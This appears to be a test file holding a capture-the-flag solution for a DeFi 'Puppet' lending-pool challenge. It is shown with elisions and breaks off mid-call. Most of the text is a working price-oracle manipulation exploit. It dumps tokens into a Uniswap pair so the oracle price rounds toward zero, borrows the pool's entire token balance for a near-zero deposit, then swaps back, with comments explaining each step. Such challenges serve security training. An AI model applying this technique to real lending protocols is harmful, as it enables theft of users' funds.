...
describe("[Challenge] Puppet", function () {
  ...
  it("Exploit", async function () {
    // Goal is to attack the _computeOraclePrice in ordeer to set the price to 0
    // and borrow all the tokens with 0 collatelar
    // The division rounds down to 0 if numerator < denominator
    // So we want to: uniswapPair.balance * (10 ** 18) << token.balanceOf(uniswapPair)

    const targetToken = this.token.connect(attacker);
    const targetPuppet = this.lendingPool.connect(attacker);
    const targetUniswap = this.uniswapExchange.connect(attacker);
    ...
    const logBalances = async () => {
      ...
      const dvtAttackerBalance = await targetToken.balanceOf(attacker.address);

      const ethUniswapBalance = await ethers.provider.getBalance(
        targetUniswap.address
      );
      const dvtUniswapBalance = await targetToken.balanceOf(
        targetUniswap.address
      );

      console.log("");
      console.log("Attacker:");
      console.log("        Eth balance:", ethAttackerBalance.toString());
      console.log("        Dvt balance:", dvtAttackerBalance.toString());
      console.log("Uniswap:");
      console.log("        Eth balance:", ethUniswapBalance.toString());
      console.log("        Dvt balance:", dvtUniswapBalance.toString());
      console.log("");
    };

    await logBalances();

    // approve tokens to use in uniswap
    await targetToken.approve(
      targetUniswap.address,
      ATTACKER_INITIAL_TOKEN_BALANCE
    );

    // Calculate how much eth to be received if input is the attacker's balance
    const payOut = await targetUniswap.getTokenToEthInputPrice(
      ATTACKER_INITIAL_TOKEN_BALANCE,
      { gasLimit: 1e6 }
    );
    console.log(ethers.utils.formatEther(payOut));

    // swap
    await targetUniswap.tokenToEthSwapInput(
      ATTACKER_INITIAL_TOKEN_BALANCE,
    ...
    // Deposit required eth in order to get all tokens from the pool
    const deposit = await targetPuppet.calculateDepositRequired(
      POOL_INITIAL_TOKEN_BALANCE
    );
    await targetPuppet.borrow(POOL_INITIAL_TOKEN_BALANCE, { value: deposit });

    await logBalances();

    // Get the eth required for this specific token amount
    const ethRequired = await targetUniswap.getEthToTokenOutputPrice(
      ATTACKER_INITIAL_TOKEN_BALANCE,
      { gasLimit: 1e6 }
    );

    // swap output
    await targetUniswap.ethToTokenSwapOutput(
      ATTACKER_INITIAL_TOKEN_BALANCE,
      (await ethers.provider.getBlock("latest")).timestamp * 2, // deadline
      {
        value: ethRequired,
